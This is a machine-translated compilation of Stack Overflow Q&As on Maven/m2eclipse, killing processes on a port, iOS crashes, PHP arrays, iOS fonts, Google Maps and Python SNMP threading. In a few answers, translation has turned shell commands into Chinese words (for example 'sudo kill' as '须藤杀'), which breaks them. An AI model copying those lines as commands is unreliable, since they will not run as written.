                        <haltOnFailure>false</haltOnFailure>
                        <totalBranchRate>25</totalBranchRate>
                        <totalLineRate>41</totalLineRate>
                        <packageLineRate>25</packageLineRate>
                        <packageBranchRate>15</packageBranchRate>
                    </check>
                </configuration>
                <executions>
                    <execution>
                        <phase>package</phase>
                        <goals>
                            <goal>cobertura</goal>
                            <goal>check</goal>
                        </goals>
                    </execution>
                </executions>
            </plugin>
            <plugin>
                <groupId>org.apache.cxf</groupId>
                <artifactId>cxf-codegen-plugin</artifactId>
                <version>${org.apache.cxf-version}</version>
                <executions>
                    <execution>
                        <id>generate-sources</id>
                        <phase>generate-sources</phase>
                        <configuration>
                            <sourceRoot>${project.build.directory}/generated/cxf</sourceRoot>
                            <wsdlOptions>
                                <wsdlOption>
                                    <wsdl>${basedir}/src/main/resources/wsdl/automation.wsdl</wsdl>
                                </wsdlOption>
                            </wsdlOptions>
                        </configuration>
                        <goals>
                            <goal>wsdl2java</goal>
                        </goals>
                    </execution>
                </executions>
            </plugin>
            <plugin>
                <groupId>org.codehaus.mojo</groupId>
                <artifactId>build-helper-maven-plugin</artifactId>
                <version>1.7</version>
                <executions>
                    <execution>
                        <phase>generate-sources</phase>
                        <goals>
                            <goal>add-source</goal>
                        </goals>
                        <configuration>
                            <sources>
                                <source>target/generated/cxf</source>
                            </sources>
                        </configuration>
                    </execution>
                </executions>
            </plugin>
            <plugin>
                <groupId>org.apache.maven.plugins</groupId>
                <artifactId>maven-eclipse-plugin</artifactId>
                <version>2.9</version>
                <configuration>
                    <additionalProjectnatures>
                        <projectnature>org.springframework.ide.eclipse.core.springnature</projectnature>
                        <projectnature>org.eclipse.jdt.groovy.core.groovyNature</projectnature>
                    </additionalProjectnatures>
                    <additionalBuildcommands>
                        <buildcommand>org.springframework.ide.eclipse.core.springbuilder</buildcommand>
                    </additionalBuildcommands>
                </configuration>
            </plugin>
        </plugins>
        <pluginManagement>
            <plugins>
                <!--This plugin's configuration is used to store Eclipse m2e settings 
                    only. It has no influence on the Maven build itself. -->
                <plugin>
                    <groupId>org.eclipse.m2e</groupId>
                    <artifactId>lifecycle-mapping</artifactId>
                    <version>1.0.0</version>
                    <configuration>
                        <lifecycleMappingMetadata>
                            <pluginExecutions>
                                <pluginExecution>
                                    <pluginExecutionFilter>
                                        <groupId>org.apache.cxf</groupId>
                                        <artifactId>
                                            cxf-codegen-plugin
                                        </artifactId>
                                        <versionRange>
                                            [${org.apache.cxf-version},)
                                        </versionRange>
                                        <goals>
                                            <goal>wsdl2java</goal>
                                        </goals>
                                    </pluginExecutionFilter>
                                    <action>
                                        <ignore />
                                    </action>
                                </pluginExecution>
                                <pluginExecution>
                                    <pluginExecutionFilter>
                                        <groupId>org.apache.maven.plugins</groupId>
                                        <artifactId>maven-compiler-plugin</artifactId>
                                        <versionRange>[2.3.2,)</versionRange>
                                        <goals>
                                            <goal>compile</goal>
                                            <goal>testCompile</goal>
                                        </goals>
                                    </pluginExecutionFilter>
                                    <action>
                                        <ignore />
                                    </action>
                                </pluginExecution>
                            </pluginExecutions>
                        </lifecycleMappingMetadata>
                    </configuration>
                </plugin>
            </plugins>
        </pluginManagement>
    </build>
    <profiles>
        <!-- Deployment profiles omitted -->
    </profiles>
</project> 
```

有没有人对如何：

1.  让 m2eclipse 导入正常工作？或者
2.  配置 STS 以允许我在项目创建/转换后将 Maven 托管依赖项添加到构建路径？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-23T03:53:36.273

以下部分：

```
 <pluginExecution>
                                <pluginExecutionFilter>
                                    <groupId>org.apache.maven.plugins</groupId>
                                    <artifactId>maven-compiler-plugin</artifactId>
                                    <versionRange>[2.3.2,)</versionRange>
                                    <goals>
                                        <goal>compile</goal>
                                        <goal>testCompile</goal>
                                    </goals>
                                </pluginExecutionFilter>
                                <action>
                                    <ignore />
                                </action>
                            </pluginExecution> 
```

在构建中禁用 java 编译器的不幸后果。删除它，我会想象事情会奏效。

我也看到了这个：

```
 <projectnature>org.eclipse.jdt.groovy.core.groovyNature</projectnature> 
```

这是一个时髦的项目吗？如果是这样，您使用的是 gmaven 还是 groovy-eclipse-compiler？

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-04T17:09:34.717

我现在已经遇到过几次这个问题，每次解决方案都本着 Andrew 的回答精神：maven 接受 pom 的某些部分，但 m2eclipse barfs on。

因此，我建议您逐个删除部分 pom，直到您可以成功地对项目进行 mavenize。只需`maven -> update configuration`在每次 pom 编辑后继续运行，直到它正常工作。我通常从删除插件配置标签块开始，从最可疑的（即最复杂的）开始。

一旦它 mavenizes，您可以恢复 pom，它应该仍然可以按预期工作。

在我开始运行之后，我会研究有问题的配置以试图找出“正确”的修复方法是什么（无论如何，根据 m2eclipse）。

我在问题中发布的解决方法将暂时起作用，并且我从未发现任何负面影响，但此解决方案感觉不那么老套，将帮助您永久隔离和解决问题。

# linux - 如何杀死Linux中特定端口上运行的进程？

> ID：11583562
> 
> 赞同：1111
> 
> 时间：2012-07-20T16:39:17.320
> 
> 标签：linux, unix, port, kill-process

我尝试使用`./shutdown.sh`from tomcat`/bin`目录关闭 tomcat。但是发现服务器没有正常关闭。因此我无法重新启动
我的 tomcat 正在端口上运行`8080`。

我想杀死运行在`8080`. 我首先想要在特定端口（8080）上运行的进程列表，以便选择要杀死的进程。

* * *

## 回答 #1

> 赞同：1336
> 
> 时间：2012-07-21T21:57:17.147

这`fuser 8080/tcp`将打印您绑定在该端口上的进程的 PID。

这`fuser -k 8080/tcp`将终止该过程。

仅适用于 Linux。更普遍的是使用`lsof -i4`（或 6 用于 IPv6）。

* * *

## 回答 #2

> 赞同：1010
> 
> 时间：2015-09-15T18:17:37.850

要列出侦听端口 8080 的任何进程：

```
lsof -i:8080 
```

要杀死监听端口 8080 的任何进程：

```
kill $(lsof -t -i:8080) 
```

或更猛烈地：

```
kill -9 $(lsof -t -i:8080) 
```

(`-9`对应于`SIGKILL - terminate immediately/hard kill`信号：请参阅[终止信号列表](https://unix.stackexchange.com/q/317492/16704)和[kill 命令中 -9 选项的目的是什么？](https://askubuntu.com/q/184071/44876)。如果没有指定信号到`kill`，则发送 TERM 信号，也`-15`就是`soft kill`发送，有时不足以杀死一个过程。）。

* * *

## 回答 #3

> 赞同：338
> 
> 时间：2012-07-20T16:39:17.320

使用命令

```
 sudo netstat -plten |grep java 
```

用作它们的过程`grep java`的`tomcat`用途。`java`

它将显示带有端口号和进程 ID 的进程列表

```
tcp6       0      0 :::8080                 :::*                    LISTEN      
1000       30070621    16085/java 
```

前面的数字`/java`是进程 ID。现在使用`kill`命令杀死进程

```
kill -9 16085 
```

`-9`意味着该进程将被强制终止。

* * *

## 回答 #4

> 赞同：244
> 
> 时间：2017-01-22T13:44:48.730

**选项 1**单线只杀死特定端口上的 LISTEN：

```
kill -9 $(lsof -t -i:3000 -sTCP:LISTEN)` 
```

* * *

**选项 2**如果您安装了 npm，您也可以运行

```
npx kill-port 3000 
```

* * *

## 回答 #5

> 赞同：172
> 
> 时间：2019-11-26T16:30:30.867

一个班轮

```
kill -9 $(lsof -t -i tcp:8080) 
```

此处的说明：使用`lsof`和的组合`kill`

```
root@localhost:~# lsof -i tcp:8080
COMMAND   PID USER   FD   TYPE  DEVICE SIZE/OFF NODE NAME
java    23672 sine  238u  IPv6 3028222      0t0  TCP localhost:http-alt (LISTEN) 
```

选择pid并使用`kill`

```
kill 23672 
```

* * *

## 回答 #6

> 赞同：131
> 
> 时间：2015-02-11T10:29:40.243

您可以使用 lsof 命令。让这里的端口号是 8090

```
lsof -i:8090 
```

此命令返回此端口上打开的进程列表。

像……</p>

```
COMMAND PID USER FD TYPE DEVICE SIZE/OFF NODE NAME
ssh 75782 eoin 5u IPv6 0x01c1c234 0t0 TCP localhost:8090 (LISTEN) 
```

要释放端口，请杀死使用它的进程（进程 ID 为 75782）...</p>

```
kill -9 75782 
```

这个对我有用。这是原始帖子的链接：[link](http://magp.ie/2011/04/19/find-process-using-port-number-in-bash/)

* * *

## 回答 #7

> 赞同：89
> 
> 时间：2018-05-18T12:29:52.617

如果要杀死在端口号 8080 上运行的进程，则首先需要找到 8080 端口的进程标识号（PID），然后将其杀死。运行以下命令查找 8080 端口号 PID：

```
sudo lsof -t -i:8080 
```

这里，

*   **sudo** - 询问管理员权限（用户 ID 和密码）的命令。
*   **lsof** - 文件列表（也用于列出相关进程）
*   **-t** - 仅显示进程 ID
*   **-i** - 仅显示与 Internet 连接相关的进程
*   **:8080** - 仅显示此端口号中的进程

因此，您现在可以使用以下命令轻松杀死您的 PID：

```
sudo kill -9 <PID> 
```

这里，

*   kill - 杀死进程的命令
*   -9 - 强行

您可以使用以下命令使用一个命令来终止特定端口上的进程：

```
sudo kill -9 $(sudo lsof -t -i:8080) 
```

有关更多信息，您可以查看以下链接 [How to kill a process on a specific port on linux](https://mr-khan.gitlab.io/linux/2018/05/02/kill-specific-port-on-linux.html)

* * *

## 回答 #8

> 赞同：76
> 
> 时间：2019-12-04T12:57:37.027

杀死特定端口上所有进程的最佳方法；

```
kill -9 $(sudo lsof -t -i:8080) 
```

* * *

## 回答 #9

> 赞同：46
> 
> 时间：2013-09-27T21:10:52.897

这会将运行的所有内容的进程 ID 打印到标准输出`<port_number>`：

```
fuser -n tcp <port_number> 
```

它还会将一些内容打印到 stderr，因此：

```
fuser -n tcp <port_number> 2> /dev/null 
```

然后我们可以将这些进程 ID 提供给`kill`命令：

```
sudo kill $(fuser -n tcp <port_number> 2> /dev/null) 
```

如果你经常这样做，你也可以把它放在一个函数中：

```
function killport() {
    sudo kill $(fuser -n tcp $1 2> /dev/null)
} 
```

* * *

## 回答 #10

> 赞同：41
> 
> 时间：2014-08-12T08:59:57.020

**要知道在特定端口上运行的服务的 pid：**

```
netstat -tulnap | grep :*port_num* 
```

您将获得该过程的描述。现在使用 kill 或 kill -9 pid。很容易被杀死。

例如

`netstat -ap | grep :8080`

```
tcp6       0      0 :::8080       :::*    LISTEN      1880/java 
```

现在：

```
kill -9 1880 
```

请记住将所有命令运行为`root`

* * *

## 回答 #11

> 赞同：38
> 
> 时间：2018-11-29T04:37:59.113

获取任务的PID并杀死它。

```
lsof -ti:8080 | xargs kill 
```

* * *

## 回答 #12

> 赞同：34
> 
> 时间：2020-07-21T10:02:38.603

首先你需要做的是运行（替换为你的端口号）：

```
fuser -k 3000/tcp 
```

这将释放端口。运行上述命令后运行：

```
service docker restart 
```

你的问题就解决了。

* * *

## 回答 #13

> 赞同：26
> 
> 时间：2015-06-26T11:15:46.263

试试这样

```
 sudo fuser -n tcp -k 8080 
```

* * *

## 回答 #14

> 赞同：19
> 
> 时间：2019-08-06T02:55:04.363

**选择端口号并在netstat**命令中应用 grep，如下所示

```
netstat -ap | grep :7070 
```

控制台输出

> tcp 0 0 :::7070 :::* LISTEN 3332/java

根据**PID**（进程标识号）杀死**服务**

 **```
kill -9 3332 
```

* * *

## 回答 #15

> 赞同：14
> 
> 时间：2015-12-16T09:26:32.407

1.  `lsof -i tcp:8000` 该命令列出运行在 8000 端口的进程信息

2.  `kill -9 [PID]` 该命令杀死进程

* * *

## 回答 #16

> 赞同：13
> 
> 时间：2014-08-12T07:14:14.873

**Linux**：如果您知道端口，则可以使用此命令：

```
netstat -plten | grep LISTEN | grep 8080 
```

**艾克斯**：

```
netstat -Aan | grep LISTEN | grep 8080 
```

然后取第一列（例如：f100050000b05bb8）并运行以下命令：

```
rmsock f100050000b05bb8 tcpcb 
```

杀死进程。

* * *

## 回答 #17

> 赞同：13
> 
> 时间：2018-03-07T13:12:03.843

**Linux**：首先，如果您知道端口，则可以找到此命令的 PID：

```
netstat -tulpn 
```

例子：-

```
 Local Address  Foreign Address  State    PID/Program name

  :::3000       :::*             LISTEN    15986/node 
```

然后，您执行 kill 过程。运行以下命令：

杀死 -9 PID

示例：-

杀死-9 15986

* * *

## 回答 #18

> 赞同：13
> 
> 时间：2020-06-17T07:12:30.830

运行以下命令查找 8080 端口号 PID：

> 须藤 lsof -t -i:8080

您现在可以使用以下命令轻松杀死您的 PID：

> 须藤杀 -9

您可以使用以下命令使用一个命令来终止特定端口上的进程：

> sudo kill -9 $(sudo lsof -t -i:8000)

* * *

## 回答 #19

> 赞同：12
> 
> 时间：2019-03-14T09:50:24.627

您可以知道系统**中运行的所有端口的列表**及其详细信息（pid、地址等）：

```
netstat -tulpn 
```

您可以通过在以下命令中提供端口号来了解**特定端口号的详细信息：**

```
sudo netstat -lutnp | grep -w '{port_number}' 
```

例如：sudo netstat -lutnp | grep -w '8080' 详细信息将像这样提供：

```
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name 
```

**如果你想使用 pid 杀死一个进程，那么**：`kill -9 {PID}`

**如果您想使用端口号终止进程**：`fuser -n tcp {port_number}`

`sudo`如果您无法访问任何内容，请使用。

* * *

## 回答 #20

> 赞同：10
> 
> 时间：2021-06-17T12:11:23.783

这将杀死在端口 80 上运行的程序

```
sudo fuser -k 80/tcp 
```

* * *

## 回答 #21

> 赞同：6
> 
> 时间：2017-05-22T05:59:54.003

`kill -9 `fuser 8080/tcp|xargs -n 1``，此命令还会杀死使用 TCP 连接侦听端口 8080 的进程

* * *

## 回答 #22

> 赞同：6
> 
> 时间：2020-06-13T22:02:12.943

只需运行此命令。不要忘记`portnumber`用您的端口替换 , ；）

```
 kill -9 $(sudo lsof -t -i:portnumber) 
```

* * *

## 回答 #23

> 赞同：4
> 
> 时间：2018-06-04T15:44:00.490

```
sudo apt-get install psmisc (or sudo yum install psmisc)
sudo fuser 80/tcp 
```

结果：80/tcp：1858 1867 1868 1869 1871

一一杀死进程

杀死 -9 1858

* * *

## 回答 #24

> 赞同：4
> 
> 时间：2020-07-14T16:08:19.873

这是 Windows 的解决方案：

```
C:\Users\Niroshan>netstat -ano|findstr "PID :8080"

Proto Local Address Foreign Address State PID
TCP 0.0.0.0:8080 0.0.0.0:0 LISTENING 18264

taskkill /pid 18264 /f 
```

* * *

## 回答 #25

> 赞同：3
> 
> 时间：2020-05-05T04:43:57.040

我正在开发一个 Yocto Linux 系统，它有一组有限的可用 Linux 工具。我想终止使用特定端口（1883）的进程。

首先，要查看我们正在监听的端口，我使用了以下命令：

```
root@root:~# netstat -lt
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       
tcp        0      0 0.0.0.0:hostmon         0.0.0.0:*               LISTEN      
tcp        0      0 localhost.localdomain:domain 0.0.0.0:*               LISTEN      
tcp        0      0 0.0.0.0:9080            0.0.0.0:*               LISTEN      
tcp        0      0 0.0.0.0:1883            0.0.0.0:*               LISTEN      
tcp        0      0 :::hostmon              :::*                    LISTEN      
tcp        0      0 localhost:domain        :::*                    LISTEN      
tcp        0      0 :::ssh                  :::*                    LISTEN      
tcp        0      0 :::1883                 :::*                    LISTEN 
```

接下来，我通过以下方式找到了使用端口 1883 的进程的名称：

```
root@root:~# fuser 1883/tcp
290 
root@root:~# ps | grep 290
  290 mosquitt 25508 S    /usr/sbin/mosquitto -c /etc/mosquitto/mosquitto.conf
12141 root      8444 S    grep 290 
```

正如我们在上面看到的，它是`/usr/sbin/mosquitto`使用端口 1883 的程序。

最后，我杀死了这个过程：

```
root@root:~# systemctl stop mosquitto 
```

我使用`systemctl`它是因为在这种情况下它是一个 systemd 服务。

* * *

## 回答 #26

> 赞同：3
> 
> 时间：2020-05-24T10:52:41.927

1.  首先检查过程`netstat -lt`
2.  检查进程ID`fuser <port number>/tcp`
3.  杀死端口上运行的进程`kill <process id>`

* * *

## 回答 #27

> 赞同：2
> 
> 时间：2019-02-09T18:38:48.990

Git Bash 的其他方式：

```
stopProcessByPortNumber() {
port=":${1}"
portStrLine="$(netstat -ano | findstr LISTENING | findstr $port)"
processId="$(grep -oP '(\d+)(?!.*\d)' <<< $portStrLine)"
echo $processId
taskkill -PID $processId -F
} 
```

* * *

## 回答 #28

> 赞同：2
> 
> 时间：2020-02-10T06:38:15.363

在我的情况下，cent os 在建议的答案中有一些问题。所以我使用了以下解决方案：

```
 ss -tanp | grep 65432 | head -1 | grep -Po "(?<=pid=).*(?=,)" | xargs kill 
```

* * *

## 回答 #29

> 赞同：1
> 
> 时间：2017-10-12T02:15:15.740

以@ [veer7](https://stackoverflow.com/users/1356127/veer7)所说的内容为基础：

如果您想知道端口上有什么，请在杀死它之前执行此操作。

```
$ sudo netstat -plten |grep java
tcp6       0      0 127.0.0.1:8005          :::*                    LISTEN      1000       906726      25296/java      
tcp6       0      0 :::8009                 :::*                    LISTEN      1000       907503      25296/java      
tcp6       0      0 :::8080                 :::*                    LISTEN      1000       907499      25296/java      
$ ps 25296
  PID TTY      STAT   TIME COMMAND
25296 ?        Sl     0:16 /usr/lib/jvm/java-8-openjdk-amd64/bin/java -Dcatalina.base=/hom 
```

使用 'ps' 和 netstat 报告的进程号

* * *

## 回答 #30

> 赞同：0
> 
> 时间：2020-08-31T11:14:25.923

如果端口上的服务没有响应，如何杀死进程

```
timeout 1 telnet localhost 8080 2>&1 | if grep -q 'Unable'; then sudo kill -9 $(sudo lsof -t -i:8080); fi 
```

它能做什么

1.  用一秒钟开始“超时”，使 telnet 退出
2.  ' 2>&1 | ' 管道错误消息而不退出
3.  如果错误消息包含“无法”，则运行 kode 以终止进程锁定端口 8080

这可以放在文件中并从“sudo crontab”定期运行

* * *

## 回答 #31

> 赞同：-2
> 
> 时间：2016-09-28T05:36:34.177

在 Windows 中，它将是`netstat -ano | grep "8080"`并且我们收到以下消息`TCP 0.0.0.0:8080 0.0.0.0:0 LISTENING 10076`

我们可以使用杀死PID `taskkill /F /PID 10076`**

# objective-c - EXC_BAD_ACCESS 使用 ARC，无法在模拟器上跟踪

> ID：11583570
> 
> 赞同：1
> 
> 时间：2012-07-20T16:39:43.473
> 
> 标签：objective-c, uiimagepickercontroller, exc-bad-access

我一直在为客户构建一个应用程序，一切都很顺利，直到我开始收到这个错误。这是一种独特的情况，我已经学会了如何使用仪器和 NSZombie，但是我不能仅在模拟器上在 iPhone 上运行带有 NSZombieEnabled 的仪器。我必须在 iPhone 中调试这个问题，因为我正在使用 UIImagePicker 拍照，并且在我拍照后不久发生错误。我也在使用 ARC，所以我根本无法设置发布或保留信息，ARC 禁止它，所以我怀疑它是双重发布或类似的东西。这个问题有 2 个可能的答案。

1：有人知道我是否可以使用照相亭将图像传递给 UIImagePicker 吗？如果我能通过相机屏幕，我可以使用仪器和 NSZombie。

2：有没有办法在不使用 iPhone 重构或注释掉代码的情况下检测哪一行会导致错误？有人知道在 iPhone 上追踪 bad_acces 的有效方法吗？

请记住，我使用的是 ARC，无法在模拟器上进行调试。如果我取出 UIImagePicker 控制脚本，则该错误不会发生，因此我将其范围缩小到我的 CameraViewController 类中的某些内容。由于已有合同，恐怕我无法发布任何代码，您必须是员工才能查看源代码。

抱歉信息有限，但我真的在寻找关于调试的答案，而不是直接解决我的确切代码问题。

将发布回溯（我认为）

```
(gdb) bt
#0  0x339737e4 in objc_msgSend ()
#1  0x31b30140 in -[UIApplication sendAction:to:from:forEvent:] ()
#2  0x31b300e0 in -[UIApplication sendAction:toTarget:fromSender:forEvent:] ()
#3  0x31b300b2 in -[UIControl sendAction:to:forEvent:] ()
#4  0x31b2fe04 in -[UIControl(Internal) _sendActionsForEvents:withEvent:] ()
#5  0x31b30452 in -[UIControl touchesEnded:withEvent:] ()
#6  0x31b2eddc in -[UIWindow _sendTouchesForEvent:] ()
#7  0x31b2e756 in -[UIWindow sendEvent:] ()
#8  0x31b299fe in -[UIApplication sendEvent:] ()
#9  0x31b29336 in _UIApplicationHandleEvent ()
#10 0x3026c04a in PurpleEventCallback ()
#11 0x3443fce2 in __CFRUNLOOP_IS_CALLING_OUT_TO_A_SOURCE1_PERFORM_FUNCTION__ ()
#12 0x3443fca6 in __CFRunLoopDoSource1 ()
#13 0x3443256c in __CFRunLoopRun ()
#14 0x34432276 in CFRunLoopRunSpecific ()
#15 0x3443217e in CFRunLoopRunInMode ()
#16 0x3026b5f2 in GSEventRunModal ()
#17 0x3026b69e in GSEventRun ()
#18 0x31ad0122 in -[UIApplication _run] ()
#19 0x31ace12e in UIApplicationMain ()
#20 0x000034ce in main (argc=1, argv=0x2ffff75c) at /Users/Andrew/Documents/Developing/Xcode Projects/ProjectSVN/Project/trunk/ProjectInterface/ProjectInterface/main.m:16 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-20T16:45:01.833

`EXC_BAD_ACCESS`不一定意味着内存管理问题。它也很容易由内存损坏或其他类型的错误引起。

发布崩溃的回溯。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-20T16:46:03.580

没有代码示例很难说，但是 ARC 并不能完全覆盖您的所有基础。例如，当对象（具有委托的类）不存在时，可能会出现这些 EXC_BAD_ACCESS 错误，但尝试执行回调委托方法。

更具体地说，假设我已经创建了一个类`viewDidLoad:`- 我们称之为`ClassA`。在我假设的情况下，我将我的视图控制器设置为`ClassA`的委托。但是，我没有为 声明一个属性`ClassA`，所以没有超出范围的引用`viewDidLoad:`。

现在让我们假设`ClassA`声明一个由我的视图控制器实现的委托方法。此委托将自身的引用传递回此委托方法中的视图控制器。因为此时它可能会或可能不会超出范围，BOOM，错误的访问错误。检查诸如此类的事情，其中​​对象不再存在并被传递给其他方法 - 这是 ARC 可能会让您失败的一种方式；）

# php - 重命名多维数组中的数组键？

> ID：11583574
> 
> 赞同：0
> 
> 时间：2012-07-20T16:40:07.733
> 
> 标签：php, multidimensional-array

这就是我得到的...

```
 $shop = array( array( first_name => "john", 
                      last_name => "doe"
                    ));         
 foreach($shop as $key => $value) {
    foreach($value as $key2 => $value2) {
            $shop[$key][$key2] = $shop[$key]['newname'];
            unset($shop[$key][$key2]);
        }}

print_r($shop); 
```

哪个输出

```
Array ( [0] => Array ( ) ) 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-20T16:54:06.557

更改分配行（第 6 行）并使其`newname`动态化。所以像：

```
...foreach ($value as $key2 => $value2) {
    $newname = 'new_' . $key2;
    $shop[$key][$newname] = $shop[$key][$key2];
    unset($shop[$key][$key2]);
}... 
```

# php - PHP - 关联数组：更改键值对的键，其中值是类对象

> ID：11583576
> 
> 赞同：4
> 
> 时间：2012-07-20T16:40:13.790
> 
> 标签：php, associative-array

我有一个形式的关联数组：

```
$input = array("one" => <class object1>,
               "two" => <class object2,
               ... //and so on); 
```

$input 的键保证是唯一的。我还有一个方法叫做`moveToHead($key)`将`$input[$key]`元素移动到这个关联数组的第 0 个位置。我有几个问题：

1.  是否可以确定关联数组的索引？
2.  如何将对应对的数组条目移动`$key => $value`到索引 0 并保持`$key`原样？
3.  实现上述两点的最佳方法是什么？

我想为第二点（一个子解决方案）做array_flip，但后来发现`array_flip`只有当数组元素是int和string时才能做到。任何指针？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-20T16:46:56.840

关联数组的“索引”是关键。在数字索引数组中，“键”是索引号。

**编辑：**我收回它。PHP 的关联数组是有序的（就像其他语言中的 Ordered Maps 一样）。

但也许您真正想要的是关联数组的有序数组？

```
$input = array(array("one" => <class object1>),
               array("two" => <class object2>)
               //...
         ); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-20T16:55:55.540

使用调用的函数，`array_keys`您可以确定键的索引：

```
$keys = array_flip(array_keys($input));
printf("Index of '%s' is: %d\n", $key, $keys[$key]); 
```

要在某个位置（例如开头）插入一个数组，有这个[`array_splice`](http://php.net/array_splice)函数。因此，您可以创建要插入的数组，从旧位置删除值并将其拼接：

```
$key = 'two';
$value = $input[$key];
unset($input[$key]);    
array_splice($input, 0, 0, array($key => $value)); 
```

[数组联合运算符](http://php.net/manual/en/language.operators.array.php)可能会出现类似的情况，但这只是因为您想移到顶部：

```
$key = 'two';
$value = $input[$key];
unset($input[$key]);
$result = array($key => $value) + $input; 
```

但我认为这可能比`array_splice`.

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-07-20T16:58:09.253

这是我想出的：

```
$arr = array('one' => 'Value1', 'two' => 'Value2', 'three' => 'Value3');

function moveToHead($array,$key) {
   $return = $array;
   $add_val = array($key => $return[$key]);
   unset($return[$key]);
   return $add_val + $return;
}

print_r(moveToHead($arr,'two')); 
```

结果是

```
Array
(
    [two] => Value2
    [one] => Value1
    [three] => Value3
) 
```

[http://codepad.org/Jcb6ebxZ](http://codepad.org/Jcb6ebxZ)

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-07-20T16:56:44.097

您可以使用内部数组指针函数来做您想做的事情：

```
$input = array(
    "one"   => "element one",
    "two"   => "element two",
    "three" => "element three",
);
reset($input); // Move to first element.
echo key($input); // "one" 
```

您可以`unset`将元素取出并将其放在前面：

```
$input = array(
    "one"   => "element one",
    "two"   => "element two",
    "three" => "element three",
);
$key = "two";
$element = $input[$key];
unset($input[$key]);
// Complicated associative array unshift:
$input = array_reverse($input);
$input[$key] = $element;
$input = array_reverse($input);
print_r($input); 
```

# iphone - 如何在同一个 UITextField 或 UITextView 中保留 2 种不同的字体？

> ID：11583581
> 
> 赞同：3
> 
> 时间：2012-07-20T16:40:40.580
> 
> 标签：iphone, ios, uitextfield, uitextview

我想在同一个`UITextField`和`UITextView`. 怎么做？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-07-20T16:57:03.217

它有点工作 - 你需要使用[Core Text](http://www.cocoanetics.com/2011/01/befriending-core-text/)和[NSAttributedString](https://developer.apple.com/library/mac/#documentation/Cocoa/Reference/Foundation/Classes/nsattributedstring_Class/Reference/Reference.html)来做到这一点。

有很多教程和示例，尽管我建议使用其他人已经制作的 UILabel 子类，例如：

[OHAttributedLabel](https://github.com/AliSoftware/OHAttributedLabel)

或者

[TTAttributedLabel](https://www.google.com/url?sa=t&rct=j&q=&esrc=s&source=web&cd=1&sqi=2&ved=0CEwQFjAA&url=https%3A%2F%2Fgithub.com%2Fmattt%2FTTTAttributedLabel%2F&ei=JY4JUPu6N8Wa2AWU8u22Bw&usg=AFQjCNGwGpeMNaaUvEYpB90EWRxAjE8OLw&cad=rja)

因为这些通常有一些方便的方法可以使处理更容易。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-20T17:16:32.217

我会用 2 个自定义文本字段覆盖来做到这一点，两者都是 backgroundcolor:clearColor，可能填充在代表背景的图像上。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-07-20T16:57:32.397

我认为不可能在同一个 UITextField 或 UITextView 中处理 2 种不同的字体。如果您想拥有不同的字体样式，您可以在 UIWebView 中设置不同的字体样式或使用 coreText API。

以下是一些可能有帮助的链接：

1.  [iPhone 开发 - 设置 UIWebView 字体](https://stackoverflow.com/questions/449773/iphone-development-setting-uiwebview-font)
2.  关于核心文本的官方文档：[https ://developer.apple.com/library/mac/#documentation/StringsTextFonts/Conceptual/CoreText_Programming/Introduction/Introduction.html](https://developer.apple.com/library/mac/#documentation/StringsTextFonts/Conceptual/CoreText_Programming/Introduction/Introduction.html)

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2014-07-14T14:15:34.410

我知道你已经选择了一个有效的答案，但是......不要那样做......这不值得。改用 webview 并使用 html 绘制所有内容。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2014-07-15T13:39:56.370

在界面生成器中，将 Text View 的 Text 字段更改为 Attributed。在出现的那个小编辑器中，您可以更改所选文本的字体/格式/颜色，就像在任何高级文本编辑器中一样。

# php - 在 MySQL Maps v3 中保存标记

> ID：11583582
> 
> 赞同：0
> 
> 时间：2012-07-20T16:40:42.530
> 
> 标签：php, mysql, google-maps-api-3

我有一个谷歌地图 v3 的项目。我得到了一个互联网的例子并改变了它。当您单击我的地图时，它会创建一个标记。但我不懂 SQL，我需要有关标记编程的帮助。我试了4个小时，没有任何进展。这是我给你看的链接。

你在这里画你的路-> [http://www.inventoresdegaragem.com/dbteste/index.htm](http://www.inventoresdegaragem.com/dbteste/index.htm)

它在这里加载-> [http://www.inventoresdegaragem.com/dbteste/loady.htm](http://www.inventoresdegaragem.com/dbteste/loady.htm)

使用 ctrl+u 查看程序。

保存信息的部分是`save_waypoints()`函数。

谢谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-20T17:35:36.883

[在文档的文章部分](https://developers.google.com/maps/articles/)有几个关于如何将 MySQL 与谷歌地图一起使用的示例

# python - Python 队列问题 - queue.get 不删除对象

> ID：11583584
> 
> 赞同：2
> 
> 时间：2012-07-20T16:40:49.620
> 
> 标签：python, multithreading, queue

我正在创建一个线程化的 python 脚本，将一些主机/ips 放入队列，然后未知数量的线程（默认为 10）从队列中获取这些主机并执行 snmp 查询。Snmp 查询正在工作，但每个线程都在查询所有主机。主机只想接收来自随机线程的单个调用。在这里，我从每个线程中获得了对主机的调用。

```
#!/usr/bin/env python
import Queue
import threading
import urllib2
import time
import datetime
import netsnmp
import pprint

queue = Queue.Queue()

class ThreadUrl(threading.Thread):
    def __init__(self, queue):
        threading.Thread.__init__(self)
        self.queue = queue
    def run(self):
        while True:
      #grabs host from queue
            item = self.queue.get()
            print item

      #grabs urls of hosts and prints first 1024 bytes of page
            dane = get_rittal(item)
            obj_in_que = self.queue.qsize()
            #print obj_in_que 
            print dane + "\n"

      #signals to queue job is done
            self.queue.task_done()

def log(message):
    now = datetime.datetime.now().strftime("%H:%M:%S")
    print "%s %s\n" % (now, message)

def convert(val,div):
    string = str(val)
    f = '%05.2f' % (float(string)*div)
    return f

def get_rittal(rittal):
    x = netsnmp.Session(Version=1,DestHost=rittal,Community='',Timeout=25000, Retries=3)
    oid_loadA = netsnmp.Varbind('.1.3.6.1.4.1.2606.100.1.2.2.1.7.1',1)
